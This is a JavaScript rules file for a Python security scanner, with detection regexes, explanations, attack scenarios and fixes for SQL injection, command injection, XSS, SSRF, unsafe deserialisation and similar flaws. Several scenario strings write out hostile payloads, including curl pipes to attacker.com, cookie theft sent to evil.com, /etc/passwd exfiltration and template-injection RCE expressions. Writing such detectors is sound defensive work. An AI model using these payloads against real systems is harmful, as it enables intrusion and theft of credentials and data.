/**
 * rules-python.js
 * Security rules for Python.
 * Covers Django, Flask, FastAPI, SQLAlchemy and standard library patterns.
 */

const INJECTION_RULES = [
  {
    id: 'PY-INJ-001',
    name: 'SQL Injection – string formatting in query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // cursor.execute("SELECT..." % var) or .format() or f-string
    pattern: /(?:execute|executemany)\s*\(\s*(?:[f]['"]|['"][^'"]*(?:%s|%d|{)[^'"]*['"]|['"][^'"]*['"]\.format\s*\()/g,
    why: 'Python string formatting is used to build SQL queries with user input.',
    scenario: "An attacker sends ' OR '1'='1 as a parameter and gains access to the entire database.",
    fix: 'Always use parameterised queries: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
    fileTypes: ['py'],
  },
  {
    id: 'PY-INJ-002',
    name: 'Command Injection – subprocess with shell=True and user input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches subprocess calls that use shell=True (required for shell injection)
    // combined with string interpolation or user-controlled variable names.
    // Without shell=True, subprocess is not vulnerable to shell injection.
    pattern: /(?:os\.system|os\.popen)\s*\(\s*(?:[f]['"]|(?:cmd|command|input|user_input|request\.|args\.|kwargs\.))|subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True[^)]*[f]['"][^)]*\)|subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*[f]['"][^)]*shell\s*=\s*True/g,
    why: 'Shell commands built with user input and executed with shell=True allow attackers to inject arbitrary shell commands.',
    scenario: 'An attacker sends "; cat /etc/passwd" as input and the server executes it as a shell command.',
    fix: 'Use subprocess with a list instead of a string: subprocess.run(["ls", path], shell=False). Never pass shell=True with user input.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-INJ-003',
    name: 'Unsafe deserialisation – pickle.loads',
    severity: 'CRITICAL',
    category: 'Insecure Deserialization (OWASP A08)',
    pattern: /pickle\.(?:loads|load|Unpickler)\s*\(/g,
    why: 'pickle.loads() can execute arbitrary Python code when deserialising untrusted data.',
    scenario: 'En angripare skickar ett manipulerat pickle-objekt som vid deserialising exekverar os.system("curl attacker.com | bash").',
    fix: 'Never use pickle for data from external sources. Use JSON, msgpack or signed formats instead.',
    fileTypes: ['py'],
  },
  {
    // PY-INJ-001b: taintAware — catches assign-then-use SQL injection
    // e.g.: user_id = request.args.get('id') → cursor.execute("SELECT..." + user_id)
    id: 'PY-INJ-001',
    name: 'SQL Injection – tainted variable in query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    taintAware: true,
    taintExtract: 'func_concat',
    // Matches execute() call that contains a variable (not just a plain string literal)
    pattern: /(?:execute|executemany)\s*\(\s*[^\n'"]{0,200}/g,
    antipattern: /execute\s*\(\s*['"]\s*(?:SELECT|INSERT|UPDATE|DELETE)[^'"]*(?:\?|%s)\s*['"][^)]*\)|execute\s*\(\s*['"]\s*(?:SELECT|INSERT|UPDATE|DELETE)[^'"]*['"],\s*[([]/i,
    why: 'A variable assigned from request input is passed into a database query without parameterisation.',
    scenario: 'user_id = request.args.get("id") followed by cursor.execute("SELECT ... WHERE id = " + user_id) — attacker injects arbitrary SQL.',
    fix: 'Use parameterised queries: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
    fileTypes: ['py'],
  },
  {
    // PY-INJ-002b: taintAware — catches assign-then-use command injection
    // e.g.: cmd = request.args.get('cmd') → os.system(cmd)
    id: 'PY-INJ-002',
    name: 'Command Injection – tainted variable in shell command',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    taintAware: true,
    taintExtract: 'func_concat',
    pattern: /(?:os\.system|os\.popen|subprocess\.(?:call|run|Popen|check_output))\s*\(\s*[^\n]{0,200}/g,
    antipattern: /shell\s*=\s*False|\bshlex\.quote\b|^\s*#/,
    why: 'A variable assigned from request input is passed to a shell command without sanitisation.',
    scenario: 'cmd = request.args.get("cmd") followed by os.system(cmd) — attacker executes arbitrary system commands.',
    fix: 'Never pass user input to shell commands. Use subprocess with a list and shell=False.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-INJ-006',
    name: 'Unparameterized query – dynamic string construction',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // Matches execute()/executemany() where the query is built with:
    //   - f-string:        cursor.execute(f"SELECT ... {var}")
    //   - % formatting:    cursor.execute("SELECT ..." % var)
    //   - .format():       cursor.execute("SELECT ...".format(...))
    //   - concatenation:   cursor.execute("SELECT ..." + var)
    // Does NOT match safe patterns (checked via antipattern):
    //   - parameterised:   cursor.execute("SELECT ... %s", (val,))
    //   - placeholder ?:   cursor.execute("SELECT ... ?", [val])
    // Matches execute() where query is built with .format(), + concat, or variable + string.
    // Excludes (inline via negative lookahead):
    //   - Safe parameterised calls: execute("...", (val,)) or execute("...", [val])
    //   - f-strings and % formatting — already covered as CRITICAL by PY-INJ-001
    pattern: /(?:execute|executemany)\s*\((?!\s*['"][^'"]*['"]\s*,\s*[(\[])(?:[^)]{0,400})(?:\.format\s*\(|['"]\s*\+\s*\w|\w\s*\+\s*['"])/g,
    why: 'The SQL query is constructed with string formatting or concatenation. Even if the current values are safe, this pattern makes future SQL injection vulnerabilities likely.',
    scenario: 'A developer adds a new parameter later and follows the same pattern — one dynamic value without parameterisation exposes the entire query to injection.',
    fix: 'Always use parameterised queries: cursor.execute("SELECT * FROM t WHERE id = %s", (user_id,)) — the database driver handles escaping safely.',
    fileTypes: ['py'],
  },
];

const AUTH_RULES = [
  {
    id: 'PY-AUTH-001',
    name: 'Flask route utan authenticationsskydd',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    // Flask route decorator without @login_required or similar
    pattern: /@app\.route\s*\([^)]+\)\s*\ndef\s+\w+\s*\([^)]*\)\s*:/g,
    antipattern: /@(?:login_required|jwt_required|token_required|permission_required|roles_required)/,
    lookahead: 50, // Must appear between @app.route and def
    why: 'Flask route is missing an authentication decorator — the endpoint can be reached without logging in.',
    scenario: 'Anyone can call the endpoint directly and access protected data or functionality.',
    fix: 'Add @login_required (Flask-Login) or @jwt_required (Flask-JWT) above the route function.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-AUTH-002',
    name: 'Mass assignment – **request.form / **request.json',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:Model|create|update)\s*\(\s*\*\*(?:request\.(?:form|json|data|args)|kwargs)\s*\)/g,
    why: 'The entire request object is passed to the model without filtering allowed fields.',
    scenario: 'An attacker adds is_admin=True to their request and gains administrator privileges if the field exists in the model.',
    fix: 'Explicitly whitelist which fields may be set: User(name=data["name"], email=data["email"])',
    fileTypes: ['py'],
  },
  {
    id: 'PY-AUTH-003',
    name: 'IDOR – object fetched without ownership check',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:get_or_404|get|filter_by\s*\(\s*id\s*=)\s*\(\s*(?:request\.|kwargs\[|args\[)/g,
    antipattern: /(?:user_id|owner_id|created_by)\s*=/,
    lookahead: 200,
    why: 'Objects are fetched directly with an ID from the request without verifying that the user owns them.',
    scenario: 'A user can change the ID in the URL and access another user\'s data.',
    fix: 'Always filter by owner: Object.query.filter_by(id=obj_id, user_id=current_user.id).first_or_404()',
    fileTypes: ['py'],
  },
];

const CRYPTO_RULES = [
  {
    id: 'PY-CRYPTO-001',
    name: 'Weak password hashing algorithm (MD5/SHA1)',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /hashlib\.(?:md5|sha1)\s*\(\s*(?:password|passwd|pwd|secret)/gi,
    why: 'MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.',
    scenario: 'An attacker who steals your database can crack MD5-hashed passwords using rainbow tables in seconds.',
    fix: 'Use bcrypt or argon2: from passlib.hash import bcrypt; bcrypt.hash(password)',
    fileTypes: ['py'],
  },
  {
    id: 'PY-CRYPTO-002',
    name: 'Hardcoded secret key i Django/Flask',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /SECRET_KEY\s*=\s*['"][^'"]{8,}['"]/g,
    antipattern: /os\.(?:environ|getenv)|config\[/,
    lookahead: 10,
    why: 'A hardcoded SECRET_KEY in the settings file is exposed in version control and to everyone with repository access.',
    scenario: 'With the SECRET_KEY an attacker can sign their own session cookies or CSRF tokens and hijack any user session.',
    fix: "Read from environment variable: SECRET_KEY = os.environ.get('SECRET_KEY') and store in .env (outside git).",
    fileTypes: ['py'],
  },
];

const SECRETS_RULES = [
  {
    id: 'PY-SECRET-001',
    name: 'Hardcoded databaseanslutning med password',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    pattern: /(?:DATABASE_URL|SQLALCHEMY_DATABASE_URI|db_url)\s*=\s*['"](?:postgres|mysql|mongodb):\/\/[^:'"]+:[^@'"]+@/gi,
    why: 'The database connection string containing the password is hardcoded in the source code.',
    scenario: 'Anyone with read access to the repository — including former employees and external contractors — now has the database password.',
    fix: "Use an environment variable: DATABASE_URL = os.environ.get('DATABASE_URL')",
    fileTypes: ['py'],
  },
];

// ── JWT ───────────────────────────────────────────────────────────────────────

const JWT_RULES = [
  {
    id: 'PY-JWT-001',
    name: 'JWT decoded without signature verification',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /jwt\.decode\s*\([^)]{0,300}(?:options\s*=\s*\{[^}]*["\']verify_signature["\']\s*:\s*False|algorithms\s*=\s*\[[^\]]*["\']none["\']|,\s*None\s*[,)])/gi,
    why: 'Disabling signature verification means anyone can forge a JWT with arbitrary claims — including elevated roles or another user\'s identity — without knowing the secret key.',
    scenario: 'AI generates jwt.decode(token, options={"verify_signature": False}) to "simplify" token parsing. An attacker crafts a token with {"role": "admin", "user_id": 1} and accesses any endpoint.',
    fix: 'Always verify: jwt.decode(token, SECRET_KEY, algorithms=["HS256"]). Never pass verify_signature=False or algorithms=["none"] in production code.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-JWT-002',
    name: 'JWT accepted with algorithm "none" – signature bypassed',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /(?:algorithm|algorithms)\s*=\s*\[?[^\]]*?["']none["']/gi,
    why: 'The "none" algorithm means the JWT has no signature at all. Any client can issue a token with arbitrary claims and the server will accept it as valid.',
    scenario: 'A configuration accepts algorithms=["HS256", "none"]. An attacker strips the signature from a valid token, changes the payload, and re-submits. The server accepts it.',
    fix: 'Explicitly allowlist only strong algorithms: algorithms=["HS256"] or algorithms=["RS256"]. Never include "none" in the list.',
    fileTypes: ['py'],
  },
];

// ── Open redirect ─────────────────────────────────────────────────────────────

const REDIRECT_RULES = [
  {
    id: 'PY-REDIRECT-001',
    name: 'Open redirect – user-controlled URL passed to redirect()',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:redirect|HttpResponseRedirect|HttpResponsePermanentRedirect)\s*\(\s*(?:request\.(?:args|form|GET|POST|values)\s*(?:\.get\s*\([^)]+\)|\[[^\]]+\])|(?:next|next_url|return_url|redirect_url|target|destination)\s*(?=[,)]))/g,
    antipattern: /(?:url_for|urlparse|is_safe_url|allowed_hosts|startswith\s*\(['"]\/)/,
    lookahead: 200,
    why: 'Redirecting to a URL taken directly from user input enables phishing attacks. An attacker crafts a link to your site that silently forwards victims to a malicious site after login.',
    scenario: 'Login endpoint does redirect(request.args.get("next")). Attacker shares link: /login?next=https://evil.com. After login, user is redirected to the attacker\'s phishing page.',
    fix: 'Validate the redirect target: use url_for() for internal routes, or check with urllib.parse that the host matches your own domain before redirecting.',
    fileTypes: ['py'],
  },
];

// ── Path traversal ────────────────────────────────────────────────────────────

const PATH_RULES = [
  {
    id: 'PY-PATH-001',
    name: 'Path traversal – user input used directly in file open()',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    // Triggers on open() calls where the path is visibly derived from:
    //   - Web framework input (request.args, request.form, request.files etc.)
    //   - String interpolation with typical user-input variable names
    //   - Direct concatenation patterns
    // Does NOT trigger on open(path, ...) where path is a plain function
    // parameter — that requires web context to be exploitable and generates
    // too many false positives in CLI tools, scripts and library code.
    pattern: /open\s*\(\s*(?:request\.(?:args|form|GET|POST|values|files)\s*(?:\.get\s*\([^)]+\)|\[[^\]]+\])|flask\.request\.|g\.get\s*\([^)]*(?:file|path|name)|f['"][^'"]*\{\s*(?:filename|filepath|file_name|file_path|name|path|user_input|input)\s*[}]|(?:base_?dir|upload_?dir|root_?dir|base_?path)\s*\+\s*(?:filename|filepath|name|path|user_input)|os\.path\.join\s*\([^)]*request\.)/g,
    why: 'Using web request input as a file path without sanitization allows attackers to read arbitrary files using path traversal sequences like ../../etc/passwd.',
    scenario: 'Endpoint reads open(request.args.get("file")). Attacker requests ?file=../../etc/passwd and receives the system password file.',
    fix: 'Use os.path.basename() to strip directory components, then join to a fixed base path: safe_path = os.path.join(UPLOAD_DIR, os.path.basename(filename)). Verify the result still starts with UPLOAD_DIR.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-PATH-002',
    name: 'Path traversal – user input in Flask send_file()',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /send_file\s*\(\s*(?:request\.(?:args|form|GET|POST)\s*(?:\.get\s*\([^)]+\)|\[[^\]]+\])|os\.path\.join\s*\([^)]*(?:request\.|args\.|filename))/g,
    why: 'Flask\'s send_file() will serve any file the process has read access to. With user-controlled paths, attackers can download source code, config files, or credentials.',
    scenario: 'Endpoint calls send_file(request.args.get("name")). Attacker requests ?name=../../config/settings.py and downloads the application source including SECRET_KEY.',
    fix: 'Use send_from_directory() with a fixed directory and basename only: send_from_directory(UPLOAD_DIR, os.path.basename(filename)). Never pass user input directly to send_file().',
    fileTypes: ['py'],
  },
  {
    // PY-PATH-001b: taintAware — catches assign-then-use path traversal
    // e.g.: filename = request.args.get('file') → open(filename)
    id: 'PY-PATH-001',
    name: 'Path traversal – tainted variable used in file open()',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    taintAware: true,
    taintExtract: 'func_concat',
    pattern: /open\s*\(\s*[^\n]{0,200}/g,
    antipattern: /os\.path\.basename|os\.path\.join\s*\([^)]*(?:UPLOAD|BASE|SAFE|ROOT)_DIR|send_from_directory/i,
    why: 'A variable assigned from request input is used as a file path without sanitisation.',
    scenario: 'filename = request.args.get("file") followed by open(filename) — attacker requests ?file=../../etc/passwd.',
    fix: 'Use os.path.basename() and join to a fixed directory: os.path.join(UPLOAD_DIR, os.path.basename(filename)). Verify result starts with UPLOAD_DIR.',
    fileTypes: ['py'],
  },
];

module.exports = {
  INJECTION_RULES,
  AUTH_RULES,
  CRYPTO_RULES,
  SECRETS_RULES,
  JWT_RULES,
  REDIRECT_RULES,
  PATH_RULES,
  ALL_RULES: [...INJECTION_RULES, ...AUTH_RULES, ...CRYPTO_RULES, ...SECRETS_RULES,
              ...JWT_RULES, ...REDIRECT_RULES, ...PATH_RULES],
};

// ── Crypto additions (P2) ───────────────────────────────────────────────────

const CRYPTO_EXTRA_RULES = [
  {
    id: 'PY-CRYPTO-003',
    name: 'Weak random generator used for security-sensitive value',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    // random.random(), random.randint(), random.choice() for tokens/passwords/OTPs
    pattern: /random\.(?:random|randint|randrange|choice|choices|shuffle)\s*\([^)]{0,60}\)[\s\S]{0,150}(?:token|password|secret|otp|code|csrf|nonce|salt|key|session)|\b(?:token|password|secret|otp|code|csrf|nonce|salt|key|session)\b[\s\S]{0,150}random\.(?:random|randint|randrange|choice|choices)\s*\(/gi,
    why: 'Python\'s random module uses the Mersenne Twister algorithm — a PRNG designed for simulations, not security. With 624 observed 32-bit outputs an attacker can fully reconstruct its internal state and predict all future values.',
    scenario: 'token = "".join(random.choices(string.ascii_letters, k=32)) used as a password-reset token. The Mersenne Twister state can be recovered from enough observed tokens, making all future tokens predictable.',
    fix: 'Use the secrets module (Python 3.6+): import secrets; token = secrets.token_hex(32). For random integers: secrets.randbelow(1000000). The secrets module uses os.urandom() which reads from the OS CSPRNG.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-CRYPTO-004',
    name: 'Hardcoded encryption key or IV in crypto operation',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    // AES cipher created with hardcoded key string
    // AES.new(b"hardcodedkey1234", ...) or Cipher(algorithms.AES(b"hardcoded"), ...)
    pattern: /(?:AES\.new|Cipher\s*\(\s*algorithms\.AES|Fernet\s*\()\s*\(\s*b?['"][a-zA-Z0-9+\/=\-_]{8,}['"]/g,
    antipattern: /os\.environ|config\.|getenv/i,
    lookahead: 60,
    why: 'Hardcoding an AES key in source code exposes it to everyone with repository access. A static key also means key rotation requires a code deploy and re-encryption of all stored data.',
    scenario: 'cipher = AES.new(b"mysecretkey12345", AES.MODE_CBC, b"myiv1234myiv1234") in source. Attacker reads key from GitHub, decrypts all data encrypted with it. Static IV also allows ciphertext correlation attacks.',
    fix: 'key = bytes.fromhex(os.environ["ENCRYPTION_KEY"])  # generate: python -c "import os; print(os.urandom(32).hex())"\nFor IV: iv = os.urandom(16)  # fresh IV per encryption, stored alongside ciphertext.\nFor simple symmetric encryption consider: from cryptography.fernet import Fernet; key = Fernet.generate_key()',
    fileTypes: ['py'],
  },
];

// ── XSS (P2) ──────────────────────────────────────────────────────────────────

const XSS_RULES = [
  {
    id: 'PY-XSS-001',
    name: 'Jinja2 |safe filter applied to user-controlled value — XSS',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // Template: {{ user.name | safe }}, {{ request.args.get('q') | safe }}
    // Also catches Markup() used to wrap user input
    pattern: /\{\{\s*(?:request\s*\.\s*(?:args|form|json|values)|[\w.]+(?:input|user|name|comment|bio|content|query|search|message)[\w.]*)\s*\|?\s*safe\s*\}\}|Markup\s*\(\s*(?:request\s*\.|[\w.]+(?:input|user|body))/gi,
    why: 'The |safe filter in Jinja2 tells the template engine to render the value as raw HTML without escaping. If the value contains attacker-controlled content, any HTML including <script> tags is rendered in the browser.',
    scenario: '{{ user.bio | safe }} renders a user profile bio without escaping. Attacker sets their bio to <script>fetch("https://evil.com/steal?c="+document.cookie)</script>. Every visitor who views the profile executes the script.',
    fix: 'Never use |safe on user-supplied data. Jinja2 escapes by default — let it. If you need to render rich content, sanitize first with bleach: import bleach; clean = bleach.clean(user_input, tags=["p","b","i"], strip=True); then pass clean to the template without |safe.',
    fileTypes: ['py', 'html'],
  },
  {
    id: 'PY-XSS-002',
    name: 'render_template_string() with user input — XSS and Server-Side Template Injection',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // render_template_string(user_input), render_template_string(f"...{user_input}...")
    pattern: /render_template_string\s*\(\s*(?:request\s*\.|f['"]|[\w.]*(?:input|user|body|data|content|query))/gi,
    why: 'render_template_string() compiles and executes a Jinja2 template from a string at runtime. If user input is part of the template string (not just a variable value), the attacker can inject Jinja2 expressions like {{ config }} to read app secrets, or {{ "".__class__.__mro__[1].__subclasses__() }} to achieve remote code execution.',
    scenario: 'render_template_string(f"Hello {request.args[\'name\']}!") — attacker passes name={{config}} and receives the Flask app configuration including SECRET_KEY. With further payloads, full RCE is possible.',
    fix: 'Never pass user input as part of the template string itself. Use render_template() with a static template file and pass user data as variables: return render_template("hello.html", name=request.args["name"]). In the template, {{ name }} is safe — it is a value, not template syntax.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-XSS-003',
    name: 'Django mark_safe() applied to user-controlled value — XSS',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // mark_safe(user_input), mark_safe(request.POST.get('x')), mark_safe(obj.field)
    pattern: /mark_safe\s*\(\s*(?:request\s*\.\s*(?:GET|POST|META)|[\w.]*(?:input|user|comment|bio|content|body|message|name)[\w.]*(?:\.get\s*\(|\.data)?)/gi,
    why: 'Django\'s mark_safe() tells the template engine that the string is safe to render as HTML without escaping. If the input comes from user data, attackers can inject arbitrary HTML and JavaScript.',
    scenario: 'mark_safe(user.bio) in a view or serializer. Bio contains <img src=x onerror=alert(document.cookie)>. When rendered in any template, the browser executes the payload and exfiltrates session cookies.',
    fix: 'Do not call mark_safe() on user data. Django escapes template variables by default — trust the escaping. For rich text: use bleach to sanitize to an allowlist of safe HTML tags before storing: import bleach; clean = bleach.linkify(bleach.clean(raw, tags=ALLOWED_TAGS, strip=True))',
    fileTypes: ['py'],
  },
];

module.exports.CRYPTO_EXTRA_RULES = CRYPTO_EXTRA_RULES;
module.exports.XSS_RULES          = XSS_RULES;
module.exports.ALL_RULES          = [...module.exports.ALL_RULES, ...CRYPTO_EXTRA_RULES, ...XSS_RULES];

// ── SSRF (P3) ─────────────────────────────────────────────────────────────────

const SSRF_RULES = [
  {
    id: 'PY-SSRF-001',
    name: 'SSRF — user-controlled URL passed to requests or urllib',
    severity: 'HIGH',
    category: 'Server-Side Request Forgery (OWASP A10)',
    // requests.get(request.args.get('url')), urllib.request.urlopen(user_url)
    pattern: /(?:requests\s*\.\s*(?:get|post|put|delete|request|head)|urllib\s*\.\s*request\s*\.\s*urlopen|httpx\s*\.\s*(?:get|post|AsyncClient))\s*\(\s*(?:request\s*\.\s*(?:args|form|json|values)|[\w.]*(?:url|endpoint|target|host|webhook)[\s\S]{0,60}request\s*\.)/gi,
    why: 'Server-Side Request Forgery allows attackers to make the application send HTTP requests to internal infrastructure. Cloud environments are particularly vulnerable — the metadata endpoint at 169.254.169.254 exposes IAM credentials, API keys, and instance configuration.',
    scenario: 'requests.get(request.args.get("url")) to fetch a remote image. Attacker passes url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name. Server returns AWS keys that grant full cloud access.',
    fix: 'Validate the URL before making the request: from urllib.parse import urlparse; parsed = urlparse(url); assert parsed.scheme in ("http","https") and parsed.hostname in ALLOWED_HOSTS. Use a DNS rebinding-resistant library like ssrf-filter, or restrict outbound calls to an allowlisted set of domains.',
    fileTypes: ['py'],
  },
];

// ── Unsafe deserialization additions (P3) ─────────────────────────────────────

const DESER_EXTRA_RULES = [
  {
    id: 'PY-INJ-004',
    name: 'Unsafe YAML deserialization — yaml.load() without SafeLoader',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // yaml.load(data) without Loader=yaml.SafeLoader or yaml.CLoader
    // yaml.load(request.data), yaml.load(f.read())
    pattern: /yaml\s*\.\s*load\s*\([^)]{0,200}\)(?![^;]{0,100}Loader\s*=\s*yaml\.(?:Safe|Base|Full)Loader)/g,
    antipattern: /Loader\s*=\s*yaml\.(?:Safe|Base|Full)Loader|yaml\.safe_load/i,
    lookahead: 80,
    why: 'yaml.load() without a safe Loader executes arbitrary Python objects embedded in the YAML document using !!python/object tags. An attacker who controls the YAML input can achieve remote code execution by crafting a payload that instantiates subprocess.Popen or os.system.',
    scenario: 'yaml.load(request.data) to parse a user-supplied config. Attacker sends: !!python/object/apply:subprocess.check_output [["id"]]. Server executes the system command and returns the output.',
    fix: 'Always use safe_load: yaml.safe_load(data). Or explicitly specify the loader: yaml.load(data, Loader=yaml.SafeLoader). Both restrict parsing to standard YAML types without executing Python-specific tags.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-INJ-005',
    name: 'Code injection — eval() or exec() with user-controlled input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // eval(request.args.get('expr')), exec(user_code)
    pattern: /\b(?:eval|exec)\s*\(\s*(?:request\s*\.\s*(?:args|form|json|data|values)|[\w.]*(?:input|user|code|expr|query|cmd|command)[\w.]*\s*(?:\.get\s*\(|\.data|\[))/gi,
    why: 'eval() and exec() execute arbitrary Python code. Any user-controlled string passed to these functions gives the attacker full code execution on the server — they can read files, make network requests, spawn processes, or exfiltrate environment variables.',
    scenario: 'eval(request.args.get("formula")) to evaluate a user-provided math expression. Attacker passes: __import__("os").system("curl https://evil.com/$(cat /etc/passwd)"). Server exfiltrates the password file.',
    fix: 'Never use eval/exec with user input. For math expressions use a safe parser: import ast; ast.literal_eval() for literals only, or a dedicated library like simpleeval. For dynamic logic, use data-driven approaches with explicit allowlisted operations.',
    fileTypes: ['py'],
  },
];

module.exports.SSRF_RULES        = SSRF_RULES;
module.exports.DESER_EXTRA_RULES = DESER_EXTRA_RULES;
module.exports.ALL_RULES         = [...module.exports.ALL_RULES, ...SSRF_RULES, ...DESER_EXTRA_RULES];

// ── EXPOSURE-regler (Python/Django/Flask) ─────────────────────────────────────
// Same class as JS FRONT-xxx: public configuration that is acceptable to expose
// i frontend men ALDRIG ska finnas i backend-source code eller .py-filer.

const EXPOSURE_RULES = [
  {
    id: 'PY-EXPOSURE-001',
    name: 'Django DEBUG=True — debug mode enabled in code',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // DEBUG = True in settings.py — should always be False in production
    pattern: /^\s*DEBUG\s*=\s*True\b/gm,
    antipattern: /os\.environ|getenv|config\./i,
    lookahead: 40,
    why: 'DEBUG=True enables the Django debug page which displays full stack traces, local variable values, SQL queries, and loaded settings — including SECRET_KEY and databasee credentials — to anyone who triggers an error. It also disables security checks and caching.',
    scenario: 'settings.py shipped with DEBUG=True to production. Any unhandled exception returns a full debug page showing the databasee connection string, all installed middleware, and the complete request/response cycle to the end user.',
    fix: 'DEBUG = os.environ.get("DJANGO_DEBUG", "False") == "True". In production the variable should never be set, defaulting to False. Use django-environ or python-decouple to manage environment-specific settings cleanly.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-EXPOSURE-002',
    name: 'Django SECRET_KEY hardcoded — cryptographic key in source',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // SECRET_KEY = 'django-insecure-...' or any hardcoded value
    pattern: /SECRET_KEY\s*=\s*['"][^'"]{8,}['"]/g,
    antipattern: /os\.environ|getenv|config\.|env\(/i,
    lookahead: 40,
    why: 'Django\'s SECRET_KEY is used to sign cookies, sessions, CSRF tokens, and password reset links. If it leaks, attackers can forge all of these. The django-insecure- prefix on generated keys is a hint that the key must be replaced before production.',
    scenario: 'SECRET_KEY = "django-insecure-abc123..." committed to a public repo. Attacker uses it to forge session cookies and bypass authentication, or generate valid password reset tokens for any account.',
    fix: 'SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]. Generate a strong key: python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())" and store in environment variables or a secrets manager.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-EXPOSURE-003',
    name: 'Flask SECRET_KEY hardcoded or set to weak value',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // app.secret_key = "hardcoded", app.config['SECRET_KEY'] = "hardcoded"
    pattern: /app\s*\.\s*(?:secret_key|config\s*\[\s*['"]SECRET_KEY['"]\s*\])\s*=\s*['"][^'"]{1,}['"]/g,
    antipattern: /os\.environ|getenv|config\./i,
    lookahead: 40,
    why: 'Flask uses SECRET_KEY to cryptographically sign session cookies. A hardcoded or weak key allows attackers to forge session data, escalate privileges, or impersonate any user by crafting a valid signed cookie.',
    scenario: 'app.secret_key = "dev" in production. Attacker signs a session cookie with role=admin using the known key. Flask accepts the cookie as legitimate and grants admin access.',
    fix: 'app.secret_key = os.environ["FLASK_SECRET_KEY"]. Generate: python -c "import secrets; print(secrets.token_hex(32))". Never use short, guessable, or hardcoded strings.',
    fileTypes: ['py'],
  },
  {
    id: 'PY-EXPOSURE-004',
    name: 'ALLOWED_HOSTS includes wildcard — accepts requests for any hostname',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // ALLOWED_HOSTS = ['*']
    pattern: /ALLOWED_HOSTS\s*=\s*\[['"\s]*\*['"\s]*\]/g,
    why: 'ALLOWED_HOSTS = ["*"] disables Django\'s host header validation. This enables HTTP Host header injection attacks where an attacker can poison password reset links, cache entries, or CSRF origins by spoofing the Host header.',
    scenario: 'Password reset email uses request.get_host() to build the reset URL. With ALLOWED_HOSTS=["*"], attacker sends a reset request with Host: evil.com. Reset email contains a link to evil.com — attacker captures the reset token.',
    fix: 'ALLOWED_HOSTS = [os.environ.get("ALLOWED_HOST", "yourdomain.com")]. List only the exact domain(s) the app serves. Never use ["*"] in production.',
    fileTypes: ['py'],
  },
];

module.exports.EXPOSURE_RULES = EXPOSURE_RULES;
module.exports.ALL_EXPOSURE_RULES = EXPOSURE_RULES;
